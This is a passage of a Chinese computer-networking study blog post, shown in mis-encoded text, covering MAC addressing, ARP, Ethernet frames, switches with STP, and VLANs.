é€’ä»¤ç‰Œçš„å¼€é”€ã€å»¶è¿Ÿï¼Œå•ç‚¹æ•…éšœï¼ˆä»¤ç‰Œæœ¬èº«ï¼‰çš„é—®é¢˜\né“¾è·¯å±‚å¯»å€ é“¾è·¯å±‚åœ°å€ï¼šåˆç§°ä¸ºé“¾è·¯åœ°å€ã€ç‰©ç†å±‚åœ°å€ã€MAC åœ°å€\nMAC åœ°å€ç”¨äºå°†ä¸€ä¸ªå¸§ä¼ è¾“åˆ°å¦ä¸€ä¸ªæ¥å£ used â€˜locallyâ€ to get frame from one interface to another physically-connected interface (same network, in IP-addressing sense)\n48 ä½çš„ MAC åœ°å€ EUI-48 IEEE çš„æ³¨å†Œç®¡ç†æœºæ„ RA è´Ÿè´£å‘å‚å®¶åˆ†é…åœ°å€å­—æ®µ 6 ä¸ªå­—èŠ‚ä¸­çš„å‰ä¸‰ä¸ªå­—èŠ‚ (å³é«˜ä½ 24 ä½)ï¼Œç§°ä¸ºç»„ç»‡å”¯ä¸€æ ‡è¯†ç¬¦ã€‚ åœ°å€å­—æ®µ 6 ä¸ªå­—èŠ‚ä¸­çš„åä¸‰ä¸ªå­—èŠ‚ (å³ä½ä½ 24 ä½) ç”±å‚å®¶è‡ªè¡ŒæŒ‡æ´¾ï¼Œç§°ä¸ºæ‰©å±•å”¯ä¸€æ ‡è¯†ç¬¦ï¼Œå¿…é¡»ä¿è¯ç”Ÿäº§å‡ºçš„é€‚é…å™¨æ²¡æœ‰é‡å¤åœ°å€ã€‚ å› æ­¤å°±ä¿è¯äº†å…¨ä¸–ç•Œæ¯ä¸ªé€‚é…å™¨ã€æ¯ä¸ªæ¥å£/ç«¯å£ï¼Œæœ‰å”¯ä¸€çš„ MAC åœ°å€ï¼ˆ$2^{24}$ä¸ªä¸åŒçš„åœ°å€ï¼‰ï¼Œç”¨è¿™ç§æ–¹å¼å¾—åˆ°çš„ 48 ä½åœ°å€ç§°ä¸º EUI-48ï¼Œè¿™é‡Œ EUI è¡¨ç¤ºæ‰©å±•çš„å”¯ä¸€æ ‡è¯†ç¬¦(Extended Unique Identifier)\nåŒæ—¶ï¼ŒMAC åœ°å€ä¸æ˜¯ç­‰çº§åŒ–çš„ï¼ˆä¸ä¸Šçº§å…¶ä»–è®¾å¤‡æ— å…³ï¼‰ï¼Œä¿è¯äº†å¯ç§»æ¤æ€§ï¼ˆå¯ä»¥æŠŠç½‘å¡ä»è¿™ä¸ªå±€åŸŸç½‘ç§»åŠ¨åˆ°å¦ä¸€ä¸ªå±€åŸŸç½‘ä½¿ç”¨ï¼‰\nMAC åœ°å€æœ‰ä»€ä¹ˆç”¨ é€‚é…å™¨ä»ç½‘ç»œä¸Šæ¯æ”¶åˆ°ä¸€ä¸ª MAC å¸§å°±é¦–å…ˆç”¨ç¡¬ä»¶æ£€æŸ¥ MAC å¸§ä¸­çš„ MAC åœ°å€\nå¦‚æœæ˜¯å‘å¾€æœ¬ç«™çš„å¸§åˆ™æ”¶ä¸‹ï¼Œç„¶åå†è¿›è¡Œå…¶ä»–çš„å¤„ç†ã€‚ å¦åˆ™å°±å°†æ­¤å¸§ä¸¢å¼ƒï¼Œä¸å†è¿›è¡Œå…¶ä»–çš„å¤„ç†ã€‚ è¿™é‡Œâ€œå‘å¾€æœ¬ç«™çš„å¸§â€åŒ…æ‹¬ï¼š\nå•æ’­(unicast)å¸§ï¼ˆä¸€å¯¹ä¸€ï¼‰ï¼šå³æ”¶åˆ°çš„å¸§çš„ MAC åœ°å€ä¸æœ¬ç«™çš„ç¡¬ä»¶åœ°å€ç›¸åŒã€‚ å¹¿æ’­(broadcast)å¸§ï¼ˆä¸€å¯¹å…¨ä½“ï¼‰ï¼šå³å‘é€ç»™æœ¬å±€åŸŸç½‘ä¸Šæ‰€æœ‰ç«™ç‚¹çš„å¸§ï¼ˆå…¨ 1 åœ°å€ï¼‰ã€‚ å¤šæ’­(multicast)å¸§ï¼ˆä¸€å¯¹å¤šï¼‰ï¼šå³å‘é€ç»™æœ¬å±€åŸŸç½‘ä¸Šä¸€éƒ¨åˆ†ç«™ç‚¹çš„å¸§ã€‚ æ··æ‚æ–¹å¼(promiscuous mode) å—…æ¢å™¨(Sniffer)å°±ä½¿ç”¨äº†è®¾ç½®ä¸ºæ··æ‚æ–¹å¼çš„ç½‘ç»œé€‚é…å™¨\né€‚é…å™¨åªè¦â€œå¬åˆ°â€æœ‰å¸§åœ¨ä»¥å¤ªç½‘ä¸Šä¼ è¾“å°±éƒ½æ‚„æ‚„åœ°æ¥æ”¶ä¸‹æ¥ï¼Œè€Œä¸ç®¡è¿™äº›å¸§æ˜¯å‘å¾€å“ªä¸ªç«™ï¼ˆæŠ“åŒ…ï¼‰\nARP åè®® â€“ Address Resolution Protocol MAC å¸§çš„æ ¼å¼ ç±»å‹æ„ä¸ºæ”¶åˆ°è¯¥å¸§ä¹‹åï¼Œåº”ä¼ é€ç»™ç½‘ç»œå±‚çš„ä½•ç§åè®®ï¼ˆå¤§éƒ¨åˆ†ä¸º IP åè®®ï¼‰\nARP è¡¨-è½¬ IP ä¸º MAC åœ¨å®é™…å·¥ä½œæ—¶ï¼Œä¸å¯èƒ½æ€»æ˜¯å’Œä¸æˆ‘ä»¬å®é™…ç›¸é‚»çš„ç‰©ç†è®¾å¤‡é€šä¿¡ï¼Œæˆ‘ä»¬å¾€å¾€ä¼šå’Œç¦»æˆ‘ä»¬å¾ˆè¿œçš„ä¸»æœºé€šä¿¡ï¼Œè¿™æ ·æˆ‘ä»¬æ— æ³•çŸ¥é“é‚£ä¸ªä¸»æœºæ¥å£çš„ MAC åœ°å€ã€‚è¿™æ—¶å€™æˆ‘ä»¬éœ€è¦åˆ©ç”¨ç½‘ç»œå±‚çš„ IP åœ°å€è½¬ä¸º MAC åœ°å€ IP åœ°å€æ˜¯åœ¨å…¨çƒèŒƒå›´å†…æ ‡è¯†ä¸€å°ä¸»æœºçš„åœ°å€\nå±€åŸŸç½‘ä¸­çš„æ¯ä¸ªèŠ‚ç‚¹ï¼ˆä¸»æœºã€è·¯ç”±å™¨ç­‰ï¼‰éƒ½æœ‰ä¸€å¼  ARP è¡¨ï¼Œå­˜å‚¨äº†å±€åŸŸç½‘ä¸­æŸäº›èŠ‚ç‚¹çš„ IP åœ°å€/MAC åœ°å€çš„æ˜ å°„å…³ç³»ï¼ˆ\u0026lt;IP address; MAC address; TTLï¼ˆå¤šä¹…åˆ é™¤ï¼‰\u0026gt;ï¼‰\nåªæœ‰æ‰¾åˆ°æ¥å£çš„ MAC åœ°å€ï¼Œæˆ‘ä»¬æ‰èƒ½åœ¨ç‰©ç†ç›¸é‚»çš„ç½‘ç»œä¸­ä¸å…¶é€šä¿¡\nåœ¨å±€åŸŸç½‘ä¸­å­¦ä¹  ARP è¡¨ ç”±æ­¤å¯è§ï¼ŒARP åè®®æ˜¯â€œå³æ’å³ç”¨â€çš„ï¼šèŠ‚ç‚¹åˆ›å»ºè‡ªå·±çš„ ARP è¡¨æ ¼ï¼Œå¹¶ä¸éœ€è¦ç½‘ç»œç®¡ç†å‘˜çš„äººå·¥å¹²æ¶‰\nä¸åœ¨å±€åŸŸç½‘ä¸­å­¦ä¹  ARP è¡¨ è¿‡ç¨‹åŸºæœ¬ç›¸åŒï¼Œä½†éœ€è¦åˆ†å¼€å…ˆä»è¾¹ç¼˜è·¯ç”±å™¨è·³è½¬ï¼Œè·å¾—å„è‡ªçš„ MAC åœ°å€\n-\u0026gt; å…·ä½“è¿‡ç¨‹ï¼Œéœ€è¦å…ˆå­¦ä¹  IP åè®®ï¼Œæ­¤å¤„ä¸å±•å¼€\nå±€åŸŸç½‘\u0026ndash;å…¸å‹å¹¿æ’­ä¿¡é“ å› ä¸ºå±€åŸŸç½‘ä¸­çš„ä»¥å¤ªç½‘è¿‡äºä¼˜ç§€è€Œè¢«å¹¿æ³›ä½¿ç”¨ï¼Œç°åœ¨ä»¥å¤ªç½‘å‡ ä¹æˆä¸ºäº†å±€åŸŸç½‘çš„åŒä¹‰è¯\nå±€åŸŸç½‘æœ€ä¸»è¦çš„ç‰¹ç‚¹æ˜¯ï¼šç½‘ç»œä¸ºä¸€ä¸ªå•ä½æ‰€æ‹¥æœ‰ï¼Œä¸”åœ°ç†èŒƒå›´å’Œç«™ç‚¹æ•°ç›®å‡æœ‰é™ï¼Œæ¯ä¸€å°ä¸»æœºéƒ½æ˜¯ç‰©ç†ç›¸é‚»çš„\nä»¥å¤ªç½‘ ä»¥å¤ªç½‘ï¼Œæ˜¯ç°åœ¨çš„äº‹å®ä¸Šçš„ä¸»æµæœ‰çº¿å±€åŸŸç½‘æŠ€æœ¯\nå•ä¸€èŠ¯ç‰‡ï¼Œå¯ä»¥å®ç°å¤šç§å¸¦å®½ï¼ˆè‡ªé€‚åº”å¸¦å®½ï¼‰ ç¬¬ä¸€ä¸ªå¹¿æ³›é‡‡ç”¨çš„å±€åŸŸç½‘æŠ€æœ¯ ç®€å•ã€ä¾¿å®œã€é€Ÿåº¦å¿« ä»¥å¤ªç½‘çš„ç‰©ç†æ‹“æ‰‘ï¼ˆphysical topologyï¼‰ æ€»çº¿æ‹“æ‰‘ï¼ˆç›´è‡³ 90 å¹´ä»£ä¸­æœŸï¼‰ æ‰€æœ‰èŠ‚ç‚¹å¤„äºåŒä¸€ç¢°æ’åŸŸï¼ˆå¯èƒ½äº’ç›¸å‘ç”Ÿç¢°æ’ï¼‰ æ˜Ÿå½¢æ‹“æ‰‘ï¼ˆç°ä»Šï¼‰ é‡‡ç”¨äº¤æ¢æœºï¼ˆswitchï¼‰ æ¯ä¸ªâ€œè¾æ¡â€è¿è¡Œå„è‡ªçš„ä»¥å¤ªç½‘åè®®ï¼Œå„è‡ªç»„æˆç¢°æ’åŸŸ æ˜Ÿå½¢ç¯çŠ¶æ‹“æ‰‘ç»“æ„æœ‰ä¸€ä¸ªé›†çº¿å™¨å……å½“è¿æ¥çº¿ï¼Œç«™ç‚¹é€šè¿‡ä¸¤æ¡ç”µçº¿è¿æ¥é›†çº¿å™¨ï¼Œè¿™ç§ç»“æ„å³ä½¿ä¸€æ¡é“¾è·¯å¤±æ•ˆäº†å…¶ä»–èŠ‚ç‚¹ä¹Ÿèƒ½æ­£å¸¸è¿è¡Œï¼Œå› æ­¤ä¸å®œæ•…éšœ\næ˜Ÿå½¢æ‹“æ‰‘ä¹Ÿå¯ç”¨äºå—æ§æ¥å…¥\nä»¥å¤ªç½‘çš„å¸§çš„ç»“æ„ preamble å‰åŒæ­¥ç æ˜¯ä¸ç®—ä»¥å¤ªç½‘çš„å¸§çš„é¦–éƒ¨çš„ï¼Œä»¥å¤ªç½‘çš„å¸§é¦–éƒ¨åŒ…æ‹¬æºåœ°å€ã€ç›®çš„åœ°å€ã€ç±»å‹ï¼Œå°¾éƒ¨ä¸ºå†—ä½™ç \nåŒè§MAC å¸§çš„ç»“æ„\nä¸€ä¸ªä»¥å¤ªç½‘å¸§çš„é•¿åº¦ä¸€å®šè¦å¤§äºäº‰ç”¨æœŸï¼Œå› ä¼ ç»Ÿè§„å®šï¼Œè‡³å°‘è¦å¤§äº 64 å­—èŠ‚\nå½“æ•°æ®å­—æ®µçš„é•¿åº¦å°äº 46 å­—èŠ‚æ—¶ï¼Œåº”åœ¨æ•°æ®å­—æ®µçš„åé¢åŠ å…¥æ•´æ•°å­—èŠ‚çš„å¡«å……å­—æ®µï¼Œä»¥ä¿è¯ä»¥å¤ªç½‘çš„ MAC å¸§é•¿ä¸å°äº 64 å­—èŠ‚ã€‚ ä¼ ç»Ÿçš„$10M/s$ä»¥å¤ªç½‘ï¼Œäº‰ç”¨æœŸä¸º$51.2Î¼s$ï¼Œæœ€çŸ­å¸§é•¿ä¸º 64bitï¼›è€Œå¯¹äº$100M/s$çš„ä»¥å¤ªç½‘ï¼ˆå¿«é€Ÿä»¥å¤ªç½‘ï¼‰ï¼Œäº‰ç”¨æœŸä¸º$5.12Î¼s$ï¼Œæœ€çŸ­å¸§é•¿ä»ä¸º 64bitã€‚äº‰ç”¨æœŸå˜åŒ–è€Œæœ€çŸ­å¸§é•¿ä¸å˜\næ— æ•ˆçš„å¸§ å¸§é•¿åº¦ä¸æ˜¯æ•´æ•°å­—èŠ‚ CRC æ ¡éªŒå¤±è´¥ æ•°æ®å­—æ®µçš„é•¿åº¦ä¸åœ¨ 46~1500 å­—èŠ‚ä¹‹é—´ï¼ˆMAC å¸§é•¿åº¦ä¸åœ¨ 64~1518 å­—èŠ‚ä¹‹é—´ï¼‰ å¯¹äºæ£€æŸ¥å‡ºçš„æ— æ•ˆ MAC å¸§å°±ç®€å•åœ°ä¸¢å¼ƒï¼Œä»¥å¤ªç½‘ä¸è´Ÿè´£é‡ä¼ ä¸¢å¼ƒçš„å¸§\nä»¥å¤ªç½‘çš„ç‰¹å¾ï¼ˆé“¾è·¯å±‚çš„ç‰¹å¾ï¼‰ æ— è¿æ¥ï¼šå‘é€çš„ NIC å’Œæ¥æ”¶çš„ NIC å¹¶ä¸éœ€è¦ç”¨æ¡æ‰‹æ¥å»ºç«‹è¿æ¥ ä¸å¯é ï¼šæ¥å—æ–¹ä¸éœ€è¦å‘é€ç¡®è®¤ å¦‚æœå‘é”™äº†å°±è¦é ä¸Šå±‚åè®®ä¿®è¡¥ï¼›ä¸Šå±‚å¦‚æœä¸ç®¡ä¸‹å±‚ä¹Ÿä¸ç®¡ï¼Œæ²¡å‘åˆ°å°±æ²¡å‘åˆ° ä»¥å¤ªç½‘çš„ä¿¡é“åˆ©ç”¨ç‡ åœ¨äº‰ç”¨æœŸå†…ï¼Œå„ç«™ç‚¹å‘é€çš„å¸§å¯èƒ½ç¢°æ’ï¼Œé‚£å®ƒä»¬ç¢°æ’ä¹‹å‰èŠ±çš„æ—¶é—´å°±ç™½è´¹äº†ï¼Œè¿™æ ·ä¿¡é“å ç”¨ç‡å°±è¾¾ä¸åˆ° 100%\nä¸€ä¸ªç«™åœ¨å‘é€å¸§æ—¶å‡ºç°äº†ç¢°æ’ã€‚ç»è¿‡ä¸€ä¸ªäº‰ç”¨æœŸ 2t åï¼ˆt æ˜¯ä»¥å¤ªç½‘å•ç¨‹ç«¯åˆ°ç«¯ä¼ æ’­æ—¶å»¶ï¼‰ï¼Œå¯èƒ½åˆå‡ºç°äº†ç¢°æ’ã€‚è¿™æ ·ç»è¿‡è‹¥å¹²ä¸ªäº‰ç”¨æœŸåï¼Œä¸€ä¸ªç«™å‘é€æˆåŠŸäº†ã€‚å‡å®šå‘é€å¸§éœ€è¦çš„æ—¶é—´æ˜¯ $T_{0}$ï¼Œæ€»å ç”¨ä¿¡é“æ—¶é—´ä¸º$T_{0}+Ï„$ ï¼ˆæœ€åä¸€ä¸ªæ¯”ç‰¹å‘å‡ºå»åè¿˜è¦åœ¨ä¿¡é“ä¸Šè·‘$Ï„$çš„æ—¶é—´ï¼‰\nå› æ­¤ï¼Œè¦æé«˜ä»¥å¤ªç½‘çš„ä¿¡é“åˆ©ç”¨ç‡ï¼Œå°±å¿…é¡»å‡å°$Ï„$ä¸$T_{0}$ä¹‹æ¯” ï¼Œæˆ‘ä»¬å¯ä»¥å°† è¿™ä¸ªæ¯”å®šä¹‰ä¸º $a = \\frac{Ï„}{T_{0}}$ ï¼Œè¿™æ ·å°±å¯ä»¥çŸ¥é“ï¼Œa è¶Šå°è¶Šå¥½\nä¸ºäº†ä½¿å¾— a æ›´å°ï¼Œ$Ï„$åº”å°½å¯èƒ½å°ï¼Œè€Œ$T_{0}$åº”è¯¥å¤§ä¸€ç‚¹ï¼Œè¿™å°±æ˜¯è¯´ï¼Œå½“æ•°æ®ç‡ä¸€å®šæ—¶ï¼Œä»¥å¤ªç½‘çš„è¿çº¿çš„é•¿åº¦å—åˆ°é™åˆ¶ï¼ŒåŒæ—¶ä»¥å¤ªç½‘çš„å¸§é•¿ä¸èƒ½å¤ªçŸ­\nå‡è®¾ç¢°æ’ä¸ä¼šå‘ç”Ÿï¼Œé‚£ä¹ˆä¿¡é“åˆ©ç”¨ç‡çš„æé™å°±åº”è¯¥æ˜¯$S_{max}=\\frac{T_{0}}{T_{0}+Ï„}=\\frac{1}{1+a}$ï¼Œå› æ­¤ a åº”è¿œå°äº 1\näº¤æ¢æœº åŒè§å¯¼è®ºä¸­çš„ã€Šäº¤æ¢æœºæ˜¯ä»€ä¹ˆã€‹\næœ€åˆäººä»¬ä½¿ç”¨çš„æ˜¯ç½‘æ¡¥(bridge)ï¼Œåæ¥ç”¨äº¤æ¢æœº(switch)å–ä»£äº†ç½‘æ¡¥\nä¸ºäº†åœ¨é“¾è·¯å±‚æ‰©å±•ä»¥å¤ªç½‘ï¼ŒæŠŠä¸åŒç½‘ç»œè¿æ¥åœ¨ä¸€èµ·ï¼Œæˆ‘ä»¬å°±éœ€è¦ä¸€ä¸ªã€é“¾è·¯å±‚çš„ä¸“æœ‰è®¾å¤‡ã€‘â€”â€”äº¤æ¢æœºï¼Œé€šå¸¸ä¹Ÿç§°ä¸ºâ€œç¬¬äºŒå±‚äº¤æ¢æœºâ€ï¼ˆL2 switchï¼‰ æœ‰ä¸€ç§éä¸»æµçš„ç»“æ„ï¼Œåœ¨ç¬¬ä¸‰å±‚ä¹Ÿæœ‰äº¤æ¢æœº\nä½œç”¨ï¼š\nå­˜å‚¨å¹¶è½¬å‘ä»¥å¤ªç½‘å¸§ æ£€æŸ¥æ”¶åˆ°çš„å¸§çš„ MAC åœ°å€ï¼Œé€‰æ‹©æ€§åœ°è½¬å‘è¯¥å¸§åˆ°ä¸€ä¸ªæˆ–å¤šä¸ªé“¾è·¯ï¼ˆå¯»å€ï¼‰ ç‰¹ç‚¹ï¼š\näº¤æ¢æœºæ˜¯é€æ˜çš„ï¼šä¸»æœºå¹¶ä¸çŸ¥é“äº¤æ¢æœºçš„å­˜åœ¨ å³æ’å³ç”¨ã€è‡ªå­¦ä¹ ï¼šäº¤æ¢æœºä¸éœ€è¦æ‰‹åŠ¨é…ç½®ï¼Œå®ƒè‡ªåŠ¨å­¦ä¹ ç½‘ç»œæ‹“æ‰‘ æ¥å£å¤šï¼šæ¯ä¸ªæ¥å£éƒ½ç›´æ¥ä¸ä¸€ä¸ªå•å°ä¸»æœºæˆ–å¦ä¸€ä¸ªäº¤æ¢æœºç›¸è¿ï¼Œå¹¶ä¸”ä¸€èˆ¬éƒ½å·¥ä½œåœ¨å…¨åŒå·¥æ–¹å¼ã€‚ å¹¶è¡Œæ€§ï¼šèƒ½åŒæ—¶è¿é€šå¤šå¯¹æ¥å£ï¼Œä½¿å¤šå¯¹ä¸»æœºèƒ½åŒæ—¶é€šä¿¡ã€‚ èƒ½ç¼“å­˜å¸§ äº¤æ¢æœºä½¿ç”¨äº†ä¸“ç”¨çš„äº¤æ¢ç»“æ„èŠ¯ç‰‡ï¼Œç”¨ç¡¬ä»¶è½¬å‘ï¼Œå…¶è½¬å‘é€Ÿç‡éå¸¸é«˜ã€‚ ä¾¿å®œå¥½ç”¨ï¼šäº¤æ¢æœºçš„æ€§èƒ½è¿œè¿œè¶…è¿‡æ™®é€šçš„é›†çº¿å™¨ï¼Œè€Œä¸”ä»·æ ¼å¹¶ä¸è´µã€‚ äº¤æ¢æœºå­¦ä¹ äº¤æ¢è¡¨/è½¬å‘è¡¨ äº¤æ¢æœºé€šè¿‡è‡ªåŠ¨å­¦ä¹ çŸ¥é“é€šè¿‡å“ªä¸ªæ¥å£èƒ½å¤Ÿè®¿é—®å¯¹åº”ä¸»æœº\nå½“äº¤æ¢æœºæ”¶åˆ°ä¸€ä¸ªå¸§çš„æ—¶å€™ï¼Œå°±è®°å½•æºåœ°å€ï¼Œç„¶åæ ¹æ®ç›®çš„åœ° MAC åœ°å€ï¼Œä»äº¤æ¢è¡¨é‡Œé¢å¯»æ‰¾å¯¹åº”æ¡ç›®\nå¦‚æœæ‰¾åˆ°äº†ï¼Œå°±ç›´æ¥å‘é€ï¼ˆè‹¥æºåœ°å€==ç›®çš„åœ°å€ï¼Œç›´æ¥ä¸¢å¼ƒè¯¥å¸§ï¼‰ å¦‚æœæ²¡æ‰¾åˆ°ï¼Œå°±åŒæ—¶å‘å‰©ä¸‹çš„å‡ ä¸ªæ¥å£åŒæ—¶å‘é€å¸§ï¼ˆæ³›æ´ª floodingï¼‰ åœ¨äº¤æ¢æœºæœ€åˆå‘æ˜çš„æ—¶å€™ï¼Œè¿™ä¸ªè¡¨æ˜¯é™æ€çš„ï¼Œéœ€è¦æ‰‹åŠ¨æ·»åŠ ï¼Œè™½ç„¶ç®€å•ä½†æ˜¯éº»çƒ¦ï¼Œè€Œä¸”è¡¨ä¼šå˜å¾—å¾ˆè‡ƒè‚¿\nå› æ­¤ï¼Œåªæœ‰å½“å‡ å°ä¸»æœºå¼€å§‹å‘é€æ•°æ®çš„æ—¶å€™ï¼Œäº¤æ¢æœºæ‰éœ€è¦å¼€å§‹å­¦ä¹ ï¼ˆæ²¡ç”¨çš„ä¸œè¥¿å­¦æ¥å¹²å˜›ï¼‰\näº¤æ¢æœºè‡ªå­¦ä¹ äº§ç”Ÿçš„é—®é¢˜ ä½†æœ‰æ—¶ä¸ºäº†å¢åŠ ç½‘ç»œçš„å¯é æ€§ï¼Œåœ¨ä½¿ç”¨ä»¥å¤ªç½‘äº¤æ¢æœºç»„ç½‘æ—¶ï¼Œå¾€å¾€ä¼šå¢åŠ ä¸€äº›å†—ä½™çš„é“¾è·¯ã€‚åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œè‡ªå­¦ä¹ çš„è¿‡ç¨‹å°±å¯èƒ½å¯¼è‡´ä»¥å¤ªç½‘å¸§åœ¨ç½‘ç»œçš„æŸä¸ªç¯è·¯ä¸­æ— é™åˆ¶åœ°å…œåœˆå­\nå¦‚å›¾ï¼Œå››ä¸ªäº¤æ¢æœºçš„æ¥å£åœ¨è‡ªå¨±è‡ªä¹\nè§£å†³æ–¹æ³•ï¼š\nIEEE çš„ 802.1D æ ‡å‡†åˆ¶å®šäº†ä¸€ä¸ªç”Ÿæˆæ ‘åè®® STP\nè¦ç‚¹æ˜¯ä¸æ”¹å˜ç½‘ç»œçš„å®é™…æ‹“æ‰‘ï¼Œä½†åœ¨é€»è¾‘ä¸Šåˆ™åˆ‡æ–­æŸäº›é“¾è·¯ï¼Œä½¿å¾—ä»ä¸€å°ä¸»æœºåˆ°æ‰€æœ‰å…¶ä»–ä¸»æœºçš„è·¯å¾„æ˜¯æ— ç¯è·¯çš„æ ‘çŠ¶ç»“æ„\nç®€è€Œè¨€ä¹‹ï¼Œé¿å…ç¯è·¯çš„å‡ºç°\nè™šæ‹Ÿå±€åŸŸç½‘ VLAN æƒ…æ™¯ä¸€ï¼šCS ç³»çš„å­¦ç”Ÿåˆ° EE ç³»åè¿˜æƒ³ä½¿ç”¨ CS ç³»çš„å±€åŸŸç½‘ï¼Œä½†æ˜¯è¿™æ ·å°±è¦ç»è¿‡ä¸­é—´æ•´ä¸ªå±€åŸŸç½‘ï¼Œæ•ˆç‡åˆä½ï¼Œåˆä¸å®‰å…¨ æƒ…æ™¯äºŒï¼šå¦‚æœå…¬å¸ä¸­å·¥ç¨‹éƒ¨é—¨çš„ä¸¤ä¸ªå·¥ç¨‹å¸ˆä¸´æ—¶è°ƒå»åˆ«çš„éƒ¨é—¨ï¼Œç„¶ååˆè°ƒå›æ¥ï¼Œé‚£å°±è¦åœ¨ç‰©ç†ä¸Šé‡æ–°å¸ƒçº¿ä¸¤æ¬¡\nå®˜æ–¹å®šä¹‰ï¼šè™šæ‹Ÿå±€åŸŸç½‘ VLAN æ˜¯ç”±ä¸€äº›å±€åŸŸç½‘ç½‘æ®µæ„æˆçš„ä¸ç‰©ç†ä½ç½®æ— å…³çš„é€»è¾‘ç»„ï¼Œè€Œè¿™äº›ç½‘æ®µå…·æœ‰æŸäº›å…±åŒçš„éœ€æ±‚ã€‚æ¯ä¸€ä¸ª VLAN çš„å¸§éƒ½æœ‰ä¸€ä¸ªæ˜ç¡®çš„æ ‡è¯†ç¬¦ï¼ŒæŒ‡æ˜å‘é€è¿™ä¸ªå¸§çš„è®¡ç®—æœºæ˜¯å±äºå“ªä¸€ä¸ª VLANã€‚\nå› æ­¤-\u0026gt;è™šæ‹Ÿå±€åŸŸç½‘å…¶å®åªæ˜¯å±€åŸŸç½‘ç»™ç”¨æˆ·æä¾›çš„ä¸€ç§æœåŠ¡ï¼Œè€Œå¹¶ä¸æ˜¯ä¸€ç§æ–°å‹å±€åŸŸç½‘ã€‚\nå¦‚å›¾ï¼Œè™šæ‹Ÿå±€åŸŸç½‘å†…å„ä¸»æœºæ˜¯é€»è¾‘ä¸Šçš„åŒç»„ï¼Œè€Œä¸æ˜¯ç‰©ç†ä¸Šçš„åŒç»„\næ¯”å¦‚ B3 å‘ B1 å‘é€ä¿¡æ¯ï¼Œ ä»¥å¤ªç½‘äº¤æ¢æœºä¸å‘è™šæ‹Ÿå±€åŸŸç½‘ä»¥å¤–çš„è®¡ç®—æœºä¼ é€ B1 çš„å¹¿æ’­ä¿¡æ¯ï¼Œè¿™æ ·æ¶ˆæ¯å°±ä¸ä¼šå‘ç»™å…¶ä»–çš„ä¸»æœºï¼ˆäº¤æ¢æœºå¯èƒ½æ³›æ´ªï¼‰ï¼Œè¿™æ ·å­æµé‡ä¹ŸèŠ‚çœäº†ï¼Œä¹Ÿæ›´å®‰å…¨äº†ï¼ˆé˜²æ­¢æ··æ‚æ¨¡å¼ï¼‰\nVLAN é™åˆ¶äº†æ¥æ”¶å¹¿æ’­ä¿¡æ¯çš„å·¥ä½œç«™æ•°ï¼Œä½¿å¾—ç½‘ç»œä¸ä¼šå› ä¼ æ’­è¿‡å¤šçš„å¹¿æ’­ä¿¡æ¯ (å³ â€œå¹¿æ’­é£æš´â€ ) è€Œå¼•èµ·æ€§èƒ½æ¶åŒ–\nè™šæ‹Ÿå±€åŸŸç½‘çš„ä¼˜ç‚¹ æ”¹å–„äº†æ€§èƒ½ ç®€åŒ–äº†ç®¡ç† é™ä½äº†æˆæœ¬ æ”¹å–„äº†å®‰å…¨æ€§ è™šæ‹Ÿå±€åŸŸç½‘çš„å®ç°æ–¹æ³• åŸºäºäº¤æ¢æœºç«¯å£ é äº¤æ¢æœºçš„ç«¯å£åŒºåˆ†ä¸åŒç»„çš„äººï¼Œä½†è¿™æ ·å°±ä¸èƒ½æ¢ç«¯å£ï¼Œäººå‘˜å°±ä¸èƒ½ç§»åŠ¨\nå±äºåœ¨ç¬¬ä¸€å±‚åˆ’åˆ†è™šæ‹Ÿå±€åŸŸç½‘çš„æ–¹æ³•\nåŸºäº MAC åœ°å€ æ ¹æ®MAC åœ°å€åˆ’åˆ†ç»„ï¼Œä½†è¿™æ ·å°±éœ€è¦æ‰‹åŠ¨ç»´æŠ¤ä¸€ä¸ªè¡¨ï¼Œæ¯”è¾ƒéº»çƒ¦ã€‚å¦‚æœç”¨æˆ·çš„ MAC åœ°å€æ”¹å˜äº†ï¼Œåˆ™éœ€è¦ç®¡ç†å‘˜é‡æ–°é…ç½® VLANã€‚\nå±äºåœ¨ç¬¬äºŒå±‚åˆ’åˆ†è™šæ‹Ÿå±€åŸŸç½‘çš„æ–¹æ³•\nåŸºäºåè®®ç±»å‹ æ ¹æ®ä»¥å¤ªç½‘å¸§çš„ç¬¬ä¸‰ä¸ªå­—æ®µâ€œç±»å‹â€å­—æ®µç¡®å®šè¯¥ç±»å‹çš„åè®®å±äºå“ªä¸€ä¸ªè™šæ‹Ÿå±€åŸŸç½‘\nå±äºåœ¨ç¬¬äºŒå±‚åˆ’åˆ†è™šæ‹Ÿå±€åŸŸç½‘çš„æ–¹æ³•\nåŸºäº IP å­ç½‘åœ°å€ æ ¹æ®ä»¥å¤ªç½‘å¸§çš„ç¬¬ä¸‰ä¸ªå­—æ®µâ€œç±»å‹â€å­—æ®µå’Œ IP åˆ†ç»„é¦–éƒ¨ä¸­çš„æº IP åœ°å€å­—æ®µç¡®å®šè¯¥ IP åˆ†ç»„å±äºå“ªä¸€ä¸ªè™šæ‹Ÿå±€åŸŸç½‘\nå±äºåœ¨ç¬¬ä¸‰å±‚åˆ’åˆ†è™šæ‹Ÿå±€åŸŸç½‘çš„æ–¹æ³•\nåŸºäºé«˜å±‚åº”ç”¨å’ŒæœåŠ¡ æ ¹æ®é«˜å±‚åº”ç”¨æˆ–æœåŠ¡ã€æˆ–è€…å®ƒä»¬çš„ç»„åˆåˆ’åˆ†è™šæ‹Ÿå±€åŸŸç½‘ï¼Œçµæ´»ä½†å¤æ‚\nVLAN çš„å¸§çš„æ ¼å¼ è™šæ‹Ÿå±€åŸŸç½‘åè®®å…è®¸åœ¨ä»¥å¤ªç½‘çš„å¸§æ ¼å¼ä¸­æ’å…¥ä¸€ä¸ª 4 å­—èŠ‚çš„æ ‡è¯†ç¬¦ï¼Œç§°ä¸ºVLAN æ ‡è®° (tag)ï¼Œç”¨æ¥æŒ‡æ˜è¯¥å¸§å±äºå“ªä¸€ä¸ªè™šæ‹Ÿå±€åŸŸç½‘\nç›¸å½“äºç»™ç‰©å“æ‰“ä¸ªæ ‡ç­¾\næ’å…¥ VLAN æ ‡è®°å¾—å‡ºçš„å¸§ç§°ä¸º802.1Q å¸§æˆ–å¸¦æ ‡è®°çš„ä»¥å¤ªç½‘å¸§\n","date":"2022å¹´11æœˆ16æ—¥","permalink":"https://peterliuzhi.top/principle/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/%E9%93%BE%E8%B7%AF%E5%B1%82/","section":"principle","summary":"To follow, without halt, one aim: There is the secret of success. â€” Anna Pavlova 